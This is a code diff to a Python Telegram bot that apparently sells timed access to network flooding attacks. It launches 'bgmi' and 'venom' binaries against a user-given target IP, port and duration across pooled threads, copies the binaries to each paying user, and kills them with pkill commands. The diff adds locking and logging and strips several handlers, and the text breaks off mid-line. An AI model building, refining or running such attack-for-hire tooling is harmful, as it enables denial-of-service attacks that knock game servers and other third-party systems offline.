@@ -7,8 +7,12 @@ import json
 import shutil
 import logging
 from telebot import types
-from threading import Thread
+from threading import Thread, Lock
 from concurrent.futures import ThreadPoolExecutor
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # --- Configuration Loading ---
 CONFIG_FILE = "config.json"
@@ -28,9 +32,12 @@ USER_FILE = config.get('user_file', 'users.json')
 LOG_FILE = config.get('log_file', 'bot.log')
 admin_balances = config.get('admin_balances', {})
 
-# Binary Paths - FIXED
+# Binary Paths
 ORIGINAL_BGMI_PATH = '/root/venom/bgmi'
-ORIGINAL_VENOM_PATH = '/root/venom/venom'  # Added missing path
+ORIGINAL_VENOM_PATH = '/root/venom/venom'
+
+# Lock for thread-safe operations
+bot_lock = Lock()
 
 # --- Helper Functions ---
 def read_users():
@@ -39,7 +46,9 @@ def read_users():
         with open(USER_FILE, 'r') as f:
             data = json.load(f)
             return {uid: datetime.datetime.fromisoformat(exp) for uid, exp in data.items()}
-    except Exception: return {}
+    except Exception as e:
+        logger.error(f"Error reading users: {e}")
+        return {}
 
 def write_users(users_dict):
     with open(USER_FILE, 'w') as f:
@@ -57,26 +66,26 @@ def admin_only(func):
         bot.reply_to(message, "❌ **Only admins can use this command.**", parse_mode="Markdown")
     return wrapper
 
-# --- Improved Shell & Threading Logic ---
+# --- Shell & Threading Logic ---
 def shell_executor(command):
-    """Improved shell execution with better error handling."""
+    """Thread-safe shell execution."""
     try:
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return process
+        with bot_lock:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return process
     except Exception as e:
-        logging.error(f"Shell execution failed: {e}")
+        logger.error(f"Shell execution failed: {e}")
         return None
 
-def run_attack_process(target, port, duration, b_path, v_path, thread_count=50):
-    """Enhanced threading with configurable thread count."""
+def run_attack_process(target, port, duration, b_path, v_path, thread_count=20):
+    """Thread-safe attack process execution."""
     cmd_bgmi = f"{b_path} {target} {port} {duration} 200"
     cmd_venom = f"{v_path} {target} {port} {duration} 200"
     
     processes = []
     
-    # Use ThreadPoolExecutor for better thread management
     with ThreadPoolExecutor(max_workers=thread_count) as executor:
-        for _ in range(thread_count // 2):  # Distribute threads between two commands
+        for _ in range(thread_count // 2):
             processes.append(executor.submit(shell_executor, cmd_bgmi))
             processes.append(executor.submit(shell_executor, cmd_venom))
     
@@ -110,80 +119,5 @@ def process_attack(message):
             return
 
         u_id = str(message.chat.id)
-        # Determine paths
         b_path = ORIGINAL_BGMI_PATH if message.chat.id in ADMIN_IDS else f"./bgmi{u_id}"
-        v_path = ORIGINAL_VENOM_PATH if message.chat.id in ADMIN_IDS else f"./venom{u_id}"
-
-        # Ensure binaries are executable
-        for path in [b_path, v_path]:
-            if os.path.exists(path):
-                os.chmod(path, 0o755)
-
-        # Launch multithreaded attack with more threads
-        Thread(target=run_attack_process, args=(target, port, duration, b_path, v_path, 100)).start()
-        
-        bot.send_message(message.chat.id, f"🚀 **Request Sent!**\nTarget: `{target}:{port}`\nDuration: `{duration}s`\nThreads: `100`", parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"⚠️ **Error: {e}**")
-
-@bot.message_handler(commands=['stop'])
-@admin_only
-def stop_attack(message):
-    """Enhanced stop command to kill all related processes."""
-    try:
-        # Kill all processes with more specific patterns
-        kill_commands = [
-            "pkill -9 -f bgmi",
-            "pkill -9 -f venom",
-            "pkill -9 -f '/root/venom/'",
-            "pkill -9 -f 'soul'"
-        ]
-        
-        for cmd in kill_commands:
-            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        bot.reply_to(message, "🛑 **All processes terminated successfully.**", parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {e}")
-
-@bot.message_handler(commands=['add'])
-@admin_only
-def add_user(message):
-    args = message.text.split()
-    if len(args) == 3:
-        user_id, days = args[1], int(args[2])
-        expiry = datetime.datetime.now() + datetime.timedelta(days=days)
-        allowed_user_ids[user_id] = expiry
-        write_users(allowed_user_ids)
-        
-        # Deploy user-specific binaries
-        try:
-            shutil.copy(ORIGINAL_BGMI_PATH, f'bgmi{user_id}')
-            shutil.copy(ORIGINAL_VENOM_PATH, f'venom{user_id}')
-            os.chmod(f'bgmi{user_id}', 0o755)
-            os.chmod(f'venom{user_id}', 0o755)
-        except Exception as e:
-            logging.error(f"Failed to copy binaries: {e}")
-
-        bot.reply_to(message, f"✅ User `{user_id}` added for `{days}` days.")
-    else:
-        bot.reply_to(message, "Usage: `/add <userId> <days>`")
-
-@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
-def my_info(message):
-    u_id = str(message.chat.id)
-    role = "Admin" if message.chat.id in ADMIN_IDS else "User"
-    expiry = allowed_user_ids.get(u_id, "Lifetime" if role == "Admin" else "No Access")
-    
-    msg = (f"👤 **Profile Info**\n"
-           f"Type: `{role}`\n"
-           f"Expiry: `{expiry}`")
-    bot.send_message(message.chat.id, msg, parse_mode="Markdown")
-
-if __name__ == '__main__':
-    print("Bot is running...")
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=0, timeout=20)
-        except Exception as e:
-            time.sleep(5)
+        v_path = OR
